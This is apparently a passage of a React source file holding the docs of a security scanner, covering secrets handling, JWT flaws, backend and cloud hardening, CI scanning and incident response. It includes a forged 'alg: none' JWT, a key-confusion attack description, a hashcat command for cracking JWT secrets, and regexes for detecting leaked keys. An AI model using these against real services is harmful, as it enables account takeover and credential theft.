1. "It's just a test key" — Development keys get committed, then accidentally used in production.
2. Convenience — Typing the key once into source code is easier than setting up .env.
3. CI/CD ignorance — Not knowing how to pass secrets to build pipelines.
4. Speed pressure — "I'll fix it after the demo" — it never gets fixed.
5. Ignorance of git history — Removing a secret from HEAD but not from git history is equivalent to leaving it exposed.

WHAT ATTACKERS DO WITH EXPOSED SECRETS
Timeline of a typical exposed key exploitation:
- 0 minutes: Key committed to GitHub
- 1–3 minutes: GitHub's public event stream is monitored by automated scanners (TruffleHog bots, LazyHunter)
- 4–10 minutes: Key is validated — API call confirms it works
- 10–30 minutes: Damage begins — data exfiltrated, compute resources spun up for crypto mining, or key sold on dark web marketplaces

Real-world cost: In 2022, a developer accidentally committed AWS root keys to a public repo. The attacker spun up 100+ high-powered EC2 instances for cryptocurrency mining within minutes. The AWS bill was $65,000 before the account was suspended.

WHERE SECRETS HIDE (And DevGuard Pro Looks)
- Environment variable fallbacks with hardcoded defaults: const key = process.env.API_KEY || 'sk-hardcoded123'
- Test files: apiKey: 'test-key-abc' in spec files
- Docker files: ENV API_KEY=myproductionkey
- Configuration files: config.json, application.yaml, settings.py
- Shell scripts: curl -H "Authorization: Bearer hardcodedtoken123" 
- Comments: // Old key: sk_prod_abc123 (don't use)
- Base64 "encoded" secrets: These are trivially decoded with atob() or base64 --decode

WHAT PATTERNS DEVGUARD PRO DETECTS
Key patterns matched (with obfuscated examples for security):
- AWS: AKIA[A-Z0-9]{16}
- GitHub tokens: ghp_[A-Za-z0-9]{36}
- Stripe keys: sk_live_[A-Za-z0-9]{24}
- Google API keys: AIza[A-Za-z0-9\-_]{35}
- JWT secrets: jwt_secret = "any_string_value"
- Generic API keys: api_key = "...", apikey = "...", API_KEY = "..."
- Passwords: password = "...", passwd = "...", pwd = "..."
- Connection strings with embedded credentials: mongodb://user:password@host`
      },
      {
        subtitle: '4.2 Secrets Management Architecture',
        content: `THE HIERARCHY OF SECRET STORAGE (Best → Worst)

LEVEL 1 — IDENTITY-BASED ACCESS (Best)
Eliminate secrets entirely by using IAM roles and service accounts. Instead of "give my app an API key to access S3," give your server an IAM role with S3 read permissions. The server is the identity — no credential required.

AWS: EC2 Instance Profiles, ECS Task Roles, Lambda Execution Roles
GCP: Service Account attached to Cloud Run/GKE
Azure: Managed Identities

LEVEL 2 — DEDICATED SECRETS MANAGERS
Encrypt secrets at rest, provide audit logs, automatic rotation, fine-grained access control.
- AWS Secrets Manager: Automatic rotation for RDS, Redshift, other services
- HashiCorp Vault: Self-hosted, most flexible, supports dynamic secrets
- Azure Key Vault: Deep Azure service integration
- GCP Secret Manager: Tight GCP IAM integration
- Doppler: Developer-friendly, SaaS, great for small teams

Access pattern (Node.js with AWS Secrets Manager):
const { SecretsManagerClient, GetSecretValueCommand } = require('@aws-sdk/client-secrets-manager');
const client = new SecretsManagerClient({ region: 'us-east-1' });

async function getSecret(secretName) {
  const command = new GetSecretValueCommand({ SecretId: secretName });
  const response = await client.send(command);
  return JSON.parse(response.SecretString);
}

const { DB_PASSWORD } = await getSecret('prod/myapp/database');

LEVEL 3 — ENVIRONMENT VARIABLES (Acceptable for Development)
.env files: Never commit. Add to .gitignore before the first commit.
.env.example: Commit this to show required variables without values.

.env.example:
DATABASE_URL=          # PostgreSQL connection string
STRIPE_SECRET_KEY=     # Get from Stripe Dashboard > API Keys
JWT_SECRET=            # Generate with: openssl rand -base64 64
GEMINI_API_KEY=        # Get from Google AI Studio
FIREBASE_SERVICE_ACCOUNT= # Base64-encoded service account JSON

Verification (pre-commit hook with Husky):
npx husky add .husky/pre-commit "node scripts/check-env-committed.js"

LEVEL 4 — NEVER (Hardcoded in Source)
Treated as immediately compromised. No exceptions.

SECRET ROTATION POLICY
Regularily rotating secrets limits the window of exposure after a breach:
- API keys: Rotate every 90 days minimum
- Database passwords: Rotate every 30–60 days
- JWT signing secrets: Rotate semi-annually, support key overlap during transition
- TLS certificates: Automate with Let's Encrypt/Certbot (90-day rotation)
- After any team member departure: Immediately rotate all keys that person had access to
- After any suspected compromise: Rotate immediately, assume breach, review logs`
      },
      {
        subtitle: '4.3 JWT Security — The Complete Picture',
        content: `JSON Web Tokens power the authentication of millions of applications. They're also frequently misconfigured.

JWT ANATOMY
A JWT has three parts separated by dots:
[Base64URL Header].[Base64URL Payload].[Signature]

Header:
{ "alg": "HS256", "typ": "JWT" }

Payload (claims):
{
  "sub": "user_id_12345",
  "email": "user@example.com",
  "role": "user",
  "iat": 1713500000,   // issued at (Unix timestamp)
  "exp": 1713503600    // expires at (Unix timestamp)
}

Signature (server-side, using secret key):
HMACSHA256(base64url(header) + "." + base64url(payload), secret)

CRITICAL: JWT payloads are BASE64 ENCODED, NOT ENCRYPTED. Anyone can decode them. Never put sensitive data (passwords, SSNs, card numbers) in JWT claims.

COMMON JWT VULNERABILITIES

1. THE "NONE" ALGORITHM ATTACK
Some early JWT libraries accepted alg: none as a valid algorithm, meaning no signature verification.
Malicious JWT: { "alg": "none" }.{ "sub": "admin", "role": "superadmin" }.

Fix: Explicitly configure which algorithms are acceptable. Never allow "none".
// node-jsonwebtoken
jwt.verify(token, secret, { algorithms: ['HS256'] }); // Allowlist only HS256

2. RS256 TO HS256 DOWNGRADE
In asymmetric JWT (RS256), the server signs with a private key and verifies with a public key. The public key is... public.

Attack: An attacker takes the server's public key, generates an HS256 JWT signed with that public key (treating it as an HS256 secret), then submits it. If the server doesn't enforce the algorithm, it verifies the HMAC signature using the public key, which succeeds.

Fix: Always specify the expected algorithm on verification.

3. WEAK SECRETS
An HS256 secret of "secret" or "password" can be brute-forced offline using hashcat.
hashcat -a 0 -m 16500 token.jwt wordlist.txt

Fix: Use at least 256 bits (32 bytes) of cryptographically random data as the secret.
Generate: openssl rand -base64 32

4. NO EXPIRATION
Without exp claim, a stolen token is valid forever.
Fix: Set short access token lifetimes (15 minutes). Use refresh tokens for session continuation.

5. TOKENS STORED IN localStorage
localStorage is accessible to any JavaScript on the page — including XSS payloads.
Fix: Store access tokens in memory (React state). Store refresh tokens in HttpOnly cookies.

RECOMMENDED JWT IMPLEMENTATION PATTERN
Authentication endpoint returns:
{
  "accessToken": "eyJ...",      // 15 min expiry, stored in memory
  "message": "Login successful" // refreshToken set as HttpOnly cookie by Set-Cookie header
}

Frontend:
- Stores accessToken in React/Zustand state (memory only)
- Automatically refreshes via silent /refresh-token call when access token expires
- On page refresh: makes /refresh-token call with cookie to get new access token

Backend refresh endpoint:
app.post('/refresh-token', (req, res) => {
  const token = req.cookies.refreshToken; // From HttpOnly cookie
  if (!token) return res.status(401).json({ error: 'No refresh token' });
  
  try {
    const payload = jwt.verify(token, REFRESH_TOKEN_SECRET, { algorithms: ['HS256'] });
    const newAccessToken = jwt.sign(
      { sub: payload.sub, email: payload.email, role: payload.role },
      ACCESS_TOKEN_SECRET,
      { algorithm: 'HS256', expiresIn: '15m' }
    );
    res.json({ accessToken: newAccessToken });
  } catch (err) {
    res.clearCookie('refreshToken');
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});`
      }
    ]
  },
  {
    id: 'ch-secure-yourself',
    title: 'How to Secure Yourself — Survival Guide',
    icon: <ShieldCheck size={16} />,
    description: 'The definitive security survival guide for modern developers: what to avoid, how to harden every layer, and how to think like a defender.',
    sections: [
      {
        subtitle: '5.1 The Developer Security Mindset',
        content: `Security is not a feature you add at the end. It's a quality attribute woven through every decision you make as a developer.

THE THREAT MODELING HABIT
Before building any feature, ask these five questions:
1. What data does this feature process or expose?
2. Who should have access to this data?
3. How could an attacker abuse this feature?
4. What's the worst-case scenario if this feature is exploited?
5. What's the minimum security control that reduces the risk to acceptable levels?

This doesn't need to be a formal meeting. These 60 seconds of thought before writing code consistently prevent the most critical vulnerabilities.

THE ATTACKER'S PERSPECTIVE
The best defenders think like attackers. An attacker approaching your application asks:
- What are the entry points? (Forms, APIs, file uploads, URL parameters, headers)
- What actions does the application perform? (Database queries, file system access, external API calls, email sending)
- What happens if I send unexpected input? (Numbers where strings expected, negative values, null, empty, extremely long strings, SQL, HTML, shell metacharacters)
- What information leaks from error messages? (Stack traces, file paths, database field names, user existence confirmation)
- What trust assumptions exist? (Is this validation client-side only? Does this API endpoint validate authorization? Does the backend verify what the frontend sends matches what's expected?)

THE SECURITY DEBT TRAP
Teams under deadline pressure routinely say "we'll fix the security issues after launch." This trap has three failure modes:
1. "After launch" never comes — there's always a new feature, a critical bug, another deadline
2. Technical debt accrues exponentially — security shortcuts compound and become harder to fix
3. The vulnerability gets exploited before you fix it

The cost of fixing a security bug doubles for every stage it passes:
- Design: 1x (free — just change the design)
- Development: 6x (code change + testing)
- Testing: 15x (code change + regression testing)
- Production (no breach): 30x (hotfix, deployment, regression)
- Production (after breach): 100x+ (incident response, forensics, regulatory fines, reputational damage, legal liability)`
      },
      {
        subtitle: '5.2 The Absolute Never-List',
        content: `These are the cardinal sins of application security. Each one has caused breaches costing millions of dollars and affecting millions of users.

AUTHENTICATION & ACCESS
❌ NEVER store passwords in plaintext or reversibly encrypted
   → Use Argon2id or bcrypt with cost ≥ 12

❌ NEVER use the same password across multiple services
   → Use a password manager (Bitwarden, 1Password)

❌ NEVER implement your own cryptography
   → Use battle-tested libraries (libsodium, Web Crypto API, OpenSSL)

❌ NEVER trust client-supplied role or permission data
   → Validate all permissions server-side from your data store, never from a JWT claim you didn't validate or a cookie you didn't sign

❌ NEVER use security questions for account recovery
   → Use email OTP with time-limited tokens or TOTP

❌ NEVER allow password reset via link without expiration
   → Reset links must expire within 15–60 minutes and be single-use

CODE QUALITY
❌ NEVER use eval() with any user-influenced data
   → There is almost no legitimate modern use case for eval(). Refactor.

❌ NEVER concatenate user input into SQL queries
   → Use parameterized queries or ORMs. Non-negotiable.

❌ NEVER parse untrusted XML without disabling external entities
   → XXE (XML External Entity) injection can read arbitrary files from the server

❌ NEVER use Math.random() for security tokens
   → Use crypto.randomBytes() (Node.js), os.urandom() (Python), SecureRandom (Java)

❌ NEVER deserialize untrusted data without validation
   → Use JSON (not Java serialization, pickle, PHP serialize) and validate the schema

❌ NEVER allow unrestricted file uploads without validation
   → Validate file type by magic bytes (not extension), limit size, scan for malware, store outside web root, generate a new filename

INFRASTRUCTURE
❌ NEVER expose admin interfaces to the public internet
   → Use VPN, bastion hosts, or IP allowlisting for admin UIs

❌ NEVER use default credentials on any service
   → Databases, message queues, container registries — all must have unique, strong credentials

❌ NEVER have a production database accessible from the internet
   → Databases belong in private subnets/VPCs with no public endpoint

❌ NEVER log sensitive data (passwords, tokens, PII)
   → Review what you're logging. Add a secret-detection pre-commit hook.

❌ NEVER skip TLS certificate validation in service-to-service communication
   → Disabling certificate validation (insecureSkipVerify, verify=False) makes you vulnerable to MitM

VERSION CONTROL
❌ NEVER commit .env files to version control
   → Add .env to .gitignore before the first commit. Use: git secrets --scan to catch mistakes.

❌ NEVER push secrets even "temporarily"  
   → Git history is permanent. Use: git-filter-repo or BFG Repo-Cleaner to purge

❌ NEVER give repository access to everyone "for convenience"
   → Apply principle of least privilege. Read-only for most contributors.

❌ NEVER merge without code review for security-sensitive components
   → Auth, payments, and admin functionality deserve mandatory review`
      },
      {
        subtitle: '5.3 Backend Hardening — Production Checklist',
        content: `Use this as your pre-launch security checklist for every backend application.

HTTP SECURITY HEADERS (Implement All)
Using Helmet.js (Express):
const helmet = require('helmet');
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
    },
  },
  crossOriginEmbedderPolicy: false,
}));

Verify headers with: https://securityheaders.com

RATE LIMITING IMPLEMENTATION
Layer 1 — Global rate limit (protect against DDoS):
const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 300,  // 300 requests per 15 minutes per IP
  standardHeaders: true,
});
app.use(globalLimiter);

Layer 2 — Endpoint-specific limits (protect auth endpoints):
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,  // Only 10 login attempts per 15 minutes
  skipSuccessfulRequests: true,
});
app.use(['/login', '/signup', '/reset-password'], authLimiter);

Layer 3 — IP + User combination (authenticated endpoint abuse):
const userLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 60,
  keyGenerator: (req) => req.user?.id || req.ip,
});

CORS CONFIGURATION
const cors = require('cors');
const allowedOrigins = [
  'https://yourproduction.com',
  process.env.NODE_ENV === 'development' ? 'http://localhost:3000' : null,
].filter(Boolean);

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  exposedHeaders: ['X-Request-ID'],
}));

INPUT VALIDATION WITH ZOD (TypeScript/JavaScript)
import { z } from 'zod';

const CreateUserSchema = z.object({
  email: z.string().email().max(255).toLowerCase(),
  password: z.string().min(8).max(72),
  name: z.string().min(1).max(100).trim(),
  role: z.enum(['user', 'viewer']),  // Never allow 'admin' to be user-supplied
  age: z.number().int().min(13).max(130).optional(),
});

app.post('/users', async (req, res) => {
  const result = CreateUserSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ 
      error: 'Validation failed',
      issues: result.error.issues.map(i => ({ field: i.path[0], message: i.message }))
    });
  }
  const { email, password, name, role } = result.data;
  // Safe to proceed with validated data
});

ERROR HANDLING — NEVER LEAK INTERNALS
// WRONG — Exposes stack traces, file paths, query details
app.use((err, req, res, next) => {
  res.status(500).json({ error: err.message, stack: err.stack });
});

// CORRECT — Log internally, send safe message to client
app.use((err, req, res, next) => {
  const requestId = req.headers['x-request-id'] || crypto.randomUUID();
  logger.error({ err, requestId, path: req.path, method: req.method });
  res.status(err.status || 500).json({
    error: err.status < 500 ? err.message : 'An internal error occurred',
    requestId, // User can provide this to support for debugging
  });
});`
      },
      {
        subtitle: '5.4 Frontend Security — Client-Side Defense',
        content: `The browser is a hostile environment. Here's how to harden your frontend.

DEPENDENCY MANAGEMENT
Every npm package you install is a risk vector. Apply strict hygiene:

Before installing a new package, evaluate:
1. Downloads per week (popularity signal): < 1000/week requires extra scrutiny
2. Last publish date: Abandoned packages accumulate vulnerabilities
3. Maintainer count: Single-maintainer packages are higher risk (account compromise, burnout)
4. Source inspection: Read the source code of critical security-adjacent packages
5. Known vulnerabilities: npm audit, Snyk, OSV.dev

Package lock file protocol:
- ALWAYS commit package-lock.json or yarn.lock
- NEVER commit node_modules
- Use npm ci (not npm install) in CI/CD — it strictly respects the lock file

SUBRESOURCE INTEGRITY (SRI)
For any script or stylesheet loaded from a CDN, add integrity and crossorigin attributes:

<link 
  rel="stylesheet" 
  href="https://cdn.example.com/styles.css"
  integrity="sha384-[hash]"
  crossorigin="anonymous">

<script 
  src="https://cdn.example.com/lib.js" 
  integrity="sha384-[hash]"
  crossorigin="anonymous">
</script>

Generate hashes: openssl dgst -sha384 -binary FILE | openssl base64 -A

SECURE FORMS
- Always use autocomplete="off" on sensitive fields (or browser-specific autocomplete=new-password for password inputs)
- Validate input client-side for UX, but NEVER rely on it for security
- Use appropriate input types (type="email", type="tel") to help browser validation
- Avoid storing form data in URL parameters (shows in browser history, server logs)
- Use POST, not GET, for any form that submits sensitive data

CLICKJACKING PREVENTION
Set this header server-side:
X-Frame-Options: DENY
OR enforce via CSP:
Content-Security-Policy: frame-ancestors 'none';

SAFE URL HANDLING
Never construct URLs from user input without validation.
Never use javascript: URLs.
Always use URL() constructor for parsing (avoids relative path exploits).

// DANGEROUS
const redirectUrl = req.query.return_to;
res.redirect(redirectUrl); // Could redirect to https://evil.com

// SAFE
const allowedPaths = ['/dashboard', '/profile', '/settings'];
const redirectTo = allowedPaths.includes(req.query.return_to) 
  ? req.query.return_to 
  : '/dashboard';
res.redirect(redirectTo);`
      },
      {
        subtitle: '5.5 Infrastructure & Cloud Security',
        content: `Cloud security misconfigurations cause 77% of cloud data breaches (IBM Security, 2023).

THE PRINCIPLE OF LEAST PRIVILEGE — IN PRACTICE
This is the most important security principle in cloud architecture.

WRONG: My app's IAM role has these permissions:
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}

RIGHT: My app's IAM role has ONLY what it needs:
{
  "Effect": "Allow",
  "Action": ["s3:GetObject", "s3:PutObject"],
  "Resource": "arn:aws:s3:::my-specific-bucket/*"
}

Establish per-service IAM roles. Never share credentials between services.

NETWORK SEGMENTATION
VPC Architecture best practice:
Public Subnet: Only load balancers and NAT gateways
Private Subnet: Application servers (no public IP)
Database Subnet: Databases only, no internet gateway, only reachable from app servers

Security Group rules:
ALB (Public): 0.0.0.0/0 → Port 443 (HTTPS)
App Servers: ALB Security Group → Port 3000 (app port)
Database: App Server Security Group → Port 5432 (PostgreSQL)

DATABASE SECURITY CHECKLIST
☐ Database not accessible from public internet
☐ Unique, strong credentials (generated, not human-chosen)
☐ Encryption at rest enabled (AES-256)
☐ Encryption in transit enforced (TLS required, not optional)
☐ Automated backups enabled, tested, stored encrypted in separate region
☐ Point-in-time recovery enabled
☐ Query logging enabled for audit
☐ Minimal database user permissions (SELECT/INSERT/UPDATE/DELETE on specific tables only)
☐ Connection pooling to prevent connection exhaustion attacks

CONTAINER SECURITY
If using Docker/Kubernetes:

Dockerfile hardening:
# Use specific versions, not :latest (supply chain attack protection)
FROM node:20.12.2-alpine3.19

# Run as non-root user (prevents container escape escalation)
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
USER appuser

# Minimize attack surface — don't install debugging tools in production
RUN npm ci --only=production && npm cache clean --force

# Read-only filesystem where possible
HEALTHCHECK --interval=30s --timeout=3s CMD node healthcheck.js

Kubernetes security context:
securityContext:
  runAsNonRoot: true
  runAsUser: 1001
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  capabilities:
    drop: ["ALL"]`
      },
      {
        subtitle: '5.6 DevSecOps — Security in Your Pipeline',
        content: `Security must be automated into every stage of the development lifecycle.

PRE-COMMIT HOOKS
Install Husky to run checks before code is committed:
npm install --save-dev husky
npx husky init

.husky/pre-commit:
#!/bin/sh
# Run DevGuard heuristic checks
npm run lint
npx gitleaks detect --staged  # Detect secrets in staged files
npm audit --audit-level=critical  # Block commits with critical CVEs

SECRET SCANNING
git-secrets (prevents committing AWS keys):
brew install git-secrets
git secrets --register-aws
git secrets --install

TruffleHog (deep repo scan):
trufflehog github --repo=https://github.com/yourorg/yourrepo

Gitleaks (CI/CD friendly):
# GitHub Actions
- name: Scan for secrets
  uses: gitleaks/gitleaks-action@v2

DEPENDENCY SCANNING IN CI
# GitHub Actions (using Dependabot or manual step)
- name: Audit dependencies
  run: |
    npm audit --audit-level=high
    # Fail the build if high or critical vulnerabilities found

SAST IN CI (DevGuard Pro CLI — Future Feature)
# Concept — integrate scanner into pipeline
- name: Run DevGuard Security Scan
  run: npx devguard-cli scan ./src --fail-on=critical
  
CONTAINER SCANNING
# Scan container images before pushing
- name: Scan image for vulnerabilities
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: 'myapp:${{ github.sha }}'
    exit-code: '1'
    severity: 'CRITICAL,HIGH'

INFRASTRUCTURE AS CODE (IaC) SCANNING
Checkov (Terraform, CloudFormation, Kubernetes):
pip install checkov
checkov -d ./terraform

PENETRATION TESTING SCHEDULE
For any application handling personal data or financial information:
- Automated DAST: Every deployment to staging (OWASP ZAP, Nikto)
- External penetration test: Quarterly (for consumer products) or annually (for internal tools)
- Red team exercise: Annually (for high-value targets — financial services, healthcare)
- Bug bounty program: Ongoing (platforms: HackerOne, Bugcrowd, Intigriti)`
      },
      {
        subtitle: '5.7 Incident Response — When (Not If) You Get Breached',
        content: `Security incidents happen to everyone. Organizations that handle them well are those that prepared before they happened.

BUILDING YOUR INCIDENT RESPONSE PLAN
Before an incident:
1. Define roles: Who is the Incident Commander? Who communicates to affected users? Who communicates to regulators?
2. Establish communication channels: A separate Slack workspace or Signal group that's not compromised
3. Document all systems: Architecture diagrams, data flows, secret locations, contact lists for all third-party services
4. Practice: Run tabletop exercises quarterly. "A database with user PII was just exposed. Go."

THE SIX PHASES OF INCIDENT RESPONSE

PHASE 1 — PREPARATION
Everything above. Can't be skipped.

PHASE 2 — IDENTIFICATION
How do you know you've been breached?
- Alert from SIEM/monitoring system
- User complaints about suspicious account activity
- Security researcher disclosure
- Unusual billing spikes (cloud compute abuse)
- Law enforcement notification
- Notification from a threat intelligence service

Time to detection is the most critical metric for limiting damage.

PHASE 3 — CONTAINMENT
Immediate actions (within minutes):
- Isolate affected systems (remove from network, don't shut down — preserve forensic evidence)
- Revoke compromised credentials (immediately rotate all potentially exposed keys)
- Block attacker's IP ranges at the firewall level
- Enable maximum-verbosity logging on all systems
- Do NOT wipe or shut down servers before forensic preservation

PHASE 4 — ERADICATION
- Identify the root cause (how did they get in?)
- Remove the attacker's persistence mechanisms (backdoors, new user accounts, cron jobs, modified files)
- Patch the vulnerability that was exploited
- Scan all systems for indicators of compromise (IoC)

PHASE 5 — RECOVERY
- Restore from known-good backups
- Harden the exploited vector before bringing systems back online
- Monitor intensely for 72 hours after restoration
- Gradually restore service, starting with least-critical systems

PHASE 6 — LESSONS LEARNED
Within 2 weeks of the incident:
- Detailed post-mortem (without blame)
- Root cause analysis
- Contributing factors
- What worked well?
- What failed?
- Specific, accountable action items with owners and deadlines
- Share findings with the team (and publicly when appropriate — transparency builds trust)

REGULATORY NOTIFICATION REQUIREMENTS
GDPR: Must notify supervisory authority within 72 hours of breach discovery if there's risk to individuals
HIPAA: Must notify HHS and affected individuals (and media if >500 affected) within 60 days
PCI DSS: Must notify card brands and acquirer immediately
CCPA: Must notify California residents "in the most expedient time possible"

Note: Consult a qualified attorney before sending any breach notifications.`
      },
      {
        subtitle: '5.8 Personal Security Hygiene for Developers',
        content: `Your personal security is the perimeter around your employer's security. A compromised developer account is a compromised company.

PASSWORD MANAGEMENT
The fundamental problem: humans are bad at generating and remembering high-entropy, unique passwords.

The solution: A password manager storing a different 20+ character random password for every site.

Recommended managers:
- Bitwarden (open source, self-hostable, free tier excellent)
- 1Password (best teams/business features)
- KeePassXC (fully offline, no cloud sync)

Rules:
- Master password: 5+ random words (diceware method): correct-horse-battery-staple-x92
- Enable 2FA on your password manager with a hardware key
- Password sharing: use the sharing feature, never copy-paste and send via Slack/email
- Regular audit: remove unused accounts, update weak/reused passwords

MULTI-FACTOR AUTHENTICATION HIERARCHY
For your most critical accounts (cloud console, GitHub, email, password manager):
1. Hardware security key (YubiKey, Google Titan Key) — Phishing-proof. The key cryptographically verifies the domain name. Cannot be tricked by a fake login page.
2. Authenticator app TOTP (Authy, Aegis, Google Authenticator) — Good. Backup codes stored offline in a safe.
3. Passkeys — New standard, growing support. Combines device biometrics with public-key cryptography.

Never use:
- SMS 2FA for high-value accounts (SIM swapping is trivially cheap in many countries)
- Email 2FA (your email is also the recovery method — circular dependency)

WORKSTATION SECURITY
☐ Full-disk encryption: FileVault (Mac), BitLocker (Windows), LUKS (Linux)
☐ Screen lock: Auto-lock after 2–5 minutes of inactivity
☐ Strong boot password/biometrics
☐ Guest accounts disabled
☐ Software firewall enabled with application-level rules
☐ Antivirus/EDR (Malwarebytes Premium, CrowdStrike Falcon Go for Mac)
☐ DNS over HTTPS (Cloudflare 1.1.1.1, NextDNS for filtering)
☐ SSH: Disable password auth, use Ed25519 keys only
☐ Audit installed applications quarterly — remove unused software

NETWORK SECURITY
At home:
- WPA3 encryption on home router (WPA2-AES at minimum — avoid WEP/WPA-TKIP)
- Change default router admin credentials
- Enable automatic firmware updates or check monthly
- Separate IoT devices on a guest VLAN
- Disable WPS (Wi-Fi Protected Setup — multiple known vulnerabilities)

On public Wi-Fi:
- Use a VPN or your phone's hotspot instead
- If VPN: WireGuard-based is preferred (Mullvad, ProtonVPN, IVPN)
- Ensure your VPN uses a kill switch (prevents traffic when VPN drops)
- Verify HTTPS on all sites (check for the lock icon + verify it's the real site)

PHISHING DEFENSE
How phishing works against developers:
- Fake GitHub notification: "Your account has been compromised, verify now" → fake GitHub login page
- Fake AWS bill alert → fake AWS console asking for 2FA code
- Compromised npm maintainer account sends malicious package with "security fix"

Red flags:
- Urgent language ("Your account will be deleted in 24 hours")
- Requests for credentials, 2FA codes, or private keys
- Slightly wrong domain names (githubb.com, arnazon.com)
- Unexpected package updates that bypass normal review

Hardware keys eliminate phishing entirely — they verify the actual domain, so fake login pages can never steal the credential.`
      }
    ]
  },
  {
    id: 'ch-ai-engine',
    title: 'AI Remediation Engine',
    icon: <Zap size={16} />,
    description: 'Technical deep-dive into DevGuard Pro\'s Gemini-powered analysis layer, prompt engineering, and output validation.',
    sections: [
      {
        subtitle: '6.1 How the AI Layer Works',
        content: `DevGuard Pro's AI Remediation Engine is built on Google Gemini 2.5 Flash, optimized for code analysis tasks.

THE ANALYSIS PROMPT STRUCTURE
When you click "AI Analysis," the following structured prompt is sent to the Gemini API:

System instruction (simplified):
"You are an expert security engineer. Analyze the provided code for vulnerabilities. Return ONLY valid JSON matching this schema: { analysis: string, fixedCode: string, severity: 'critical'|'high'|'medium'|'low' }. The 'fixedCode' must be complete and functional. Never include markdown in the JSON values."

User message:
"Code Language: [detected language]
Detected Issues: [list of heuristic findings]
Code Snippet: [the code to analyze]"

OUTPUT VALIDATION
Every API response undergoes local validation before being displayed:
1. JSON parsing — if it fails, the response is shown as raw text
2. Schema validation — all required fields present?
3. Code syntax check — does the fixedCode appear syntactically valid?
4. XSS safety check — the fixedCode is rendered in a code block, never as HTML

RATE LIMITS & QUOTAS
Google AI Studio free tier: 2 requests per minute (RPM) for Gemini 2.5 Flash
DevGuard Pro displays a user-friendly error when this limit is hit, with a countdown timer.

For production-scale use, upgrade to a Google Cloud paid tier:
Gemini 2.5 Flash: ~$0.075 per 1M input tokens + $0.30 per 1M output tokens
A typical DevGuard analysis consumes ~500-2000 input tokens and ~300-800 output tokens
Cost per analysis: approximately $0.05–$0.20 at paid tier rates`
      },
      {
        subtitle: '6.2 Heuristic Engine — Pattern Library',
        content: `The heuristic engine operates without any AI costs, making it suitable for unlimited scanning.

HOW PATTERNS ARE MATCHED
Each vulnerability signature is a combination of:
1. A regular expression (or multiple) to detect the pattern
2. A severity classification (critical/high/medium/low)
3. A human-readable message explaining the vulnerability
4. A remediation hint pointing to the fix strategy
5. Language specificity filters (some patterns only apply to certain languages)

PATTERN CATEGORIES COVERED

SECRETS DETECTION
Matches patterns like:
- api_key = "value" (any variable name containing 'key', 'secret', 'token', 'password', 'credential')
- Bearer [random-looking-string] in code (not in headers — that's legitimate)
- Begin patterns for private keys (RSA, EC, OpenSSH)
- Service-specific key patterns (AWS AKIA prefix, Stripe sk_live/sk_test, etc.)

DANGEROUS FUNCTION CALLS
JavaScript/TypeScript: eval(), new Function(), setTimeout(string), Function(string)()
Python: exec(), eval(), subprocess.call(shell=True)
PHP: eval(), system(), exec(), passthru(), shell_exec()
Java: Runtime.getRuntime().exec(), ProcessBuilder with variable input
Ruby: system(), exec(), %x{}, backtick operator with input

DATABASE/QUERY INJECTION RISKS
SQL: String concatenation patterns adjacent to query keywords (SELECT, INSERT, UPDATE, DELETE, WHERE)
MongoDB: User input directly in $where or $function operators
Command: User input passed to OS execution functions

FRONTEND RISKS
innerHTML assignment with dynamic values
document.write() with any variable
Location.href = unvalidated input
postMessage without origin validation
LocalStorage usage with sensitive key names (password, token, secret)

CRYPTO WEAKNESSES
MD5 and SHA1 in security contexts
DES, 3DES, RC4 cipher usage
Static/hardcoded IV values
RSA with exponent e=3 or small key sizes
Math.random() used for tokens, OTPs, or security IDs`
      }
    ]
  },
  {
    id: 'ch-monitoring',
    title: 'Security Monitoring & History',
    icon: <Activity size={16} />,
    description: 'Understanding your security posture through scan history, metrics, and long-term trend analysis.',
    sections: [
      {
        subtitle: '7.1 The Security Posture Dashboard',
        content: `DevGuard Pro's Dashboard provides three critical metrics at a glance:

TOTAL SCANS EXECUTED
The number of unique code snippets you've analyzed. A growing number here indicates an active security-conscious development practice.

TOTAL ISSUES DETECTED
The cumulative count of vulnerabilities found across all scans. A declining ratio (issues per scan) over time indicates improvement in coding practices.

CRITICAL VIOLATIONS
The count of critical-severity findings. This should trend toward zero. Critical violations represent immediate business risk and should never reach production code.

BOOKMARKS — YOUR EXECUTIVE BRIEF
Bookmarked scans are promoted to the Dashboard summary table. Use bookmarks for:
- Scans that represent milestone states (before/after a security refactor)
- Scans that found particularly severe vulnerabilities worth remembering
- Scans of production-like code that serve as security baselines
- Scans you want to share with your team leads or security officers`
      },
      {
        subtitle: '7.2 Using Scan History Effectively',
        content: `The History page is your security journal. Here's how to get the most from it.

CODE RESTORATION (Time Travel)
The "Restore" button in each history item loads the code snippet back into the Scanner, exactly as it was when the scan was performed. Use this to:
- Compare old vs new implementations of the same function
- Reproduce a vulnerability from a previous sprint
- Demonstrate improvement to stakeholders (before/after comparison)

TRACKING IMPROVEMENT OVER TIME
Sort your history chronologically. Notice the trend in issue counts:
- Week 1: 12 issues in user authentication module
- Week 2: 8 issues after refactoring
- Week 3: 3 issues after security review
- Week 4: 0 issues — production ready

This narrative is powerful for performance reviews, client security reports, and developer portfolio documentation.

VULNERABILITY DETAILS IN HISTORY
Expand any history item to see the full vulnerability report as it was captured. This is valuable for:
- Post-mortems: "When did this vulnerability first appear?"
- Audits: "Show me all scans from the Q1 2026 audit period"
- Training: "Here's a real example of SQL injection from our own code — let's learn from it"`
      }
    ]
  },
  {
    id: 'ch-advanced',
